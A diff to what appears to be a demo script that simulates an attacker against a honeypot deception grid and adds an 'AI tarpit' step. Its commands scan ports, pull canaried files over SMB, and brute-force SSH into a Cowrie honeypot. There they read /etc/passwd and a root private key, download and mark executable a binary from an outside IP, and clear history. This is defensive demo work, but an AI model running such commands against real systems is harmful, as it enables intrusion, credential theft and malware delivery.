@@ -15,28 +15,38 @@ echo " [attacker] target subnet: the Meridian deception grid"
 echo "=============================================================="
 
 echo
-echo "[1/4] RECON — port scan across the decoy hosts"
+echo "[1/5] RECON — port scan across the decoy hosts"
 nmap -Pn --host-timeout 20s -p 21,22,80,445,2222,3306 \
   cowrie opencanary fileserver intranet jumphost 2>&1 | grep -E 'Nmap scan|open|Nmap done'
 
 echo
-echo "[2/4] SMB DISCOVERY + EXFIL — pull the juicy (canaried) files"
+echo "[2/5] SMB DISCOVERY + EXFIL — pull the juicy (canaried) files"
 smbclient //fileserver/company -N -c 'ls' 2>&1 | head -15
 smbclient //fileserver/company -N -c 'cd it; ls; get passwords.xlsx /tmp/passwords.xlsx' 2>&1 | head -6
 smbclient //fileserver/company -N -c 'cd finance; get vendor_payments.xlsx /tmp/vp.xlsx' 2>&1 | head -3
 echo "   (loot dropped in /tmp inside attacker container — the canary just fired)"
 
 echo
-echo "[3/4] TRIPWIRE — poke OpenCanary's fake services"
+echo "[3/5] TRIPWIRE — poke OpenCanary's fake services"
 nc -w 3 opencanary 21 </dev/null 2>&1 | head -1
 nc -w 3 opencanary 3306 </dev/null 2>&1 | head -1
 curl -s -m 3 http://opencanary/login -o /dev/null 2>&1
 
 echo
-echo "[4/4] SSH HONEYPOT — brute into cowrie and run a recon session"
+echo "[4/5] SSH HONEYPOT — brute into cowrie and run a recon session"
 sshpass -p 'hunter2' ssh $SSH_OPTS -p 2222 root@cowrie \
   'uname -a; whoami; id; cat /etc/passwd; ls -la /root; cat /root/.ssh/id_rsa; wget http://185.220.101.7/x86 -O /tmp/x86; chmod +x /tmp/x86; history -c' \
   2>&1 | head -40
+
+echo
+echo "[5/5] AI TARPIT — chase the 'internal portal' down a rabbit hole"
+# Each request returns believable AI-generated fake content (and is deliberately
+# slow), luring the attacker deeper and wasting their time.
+for p in "admin/config.env" "backups/db_dump.sql" "etc/passwd" "internal/wiki/credentials"; do
+  echo "   GET /$p"
+  curl -s -m 12 "http://tarpit:8080/$p" 2>&1 | head -4
+  echo "   ---"
+done
 
 echo
 echo "=============================================================="
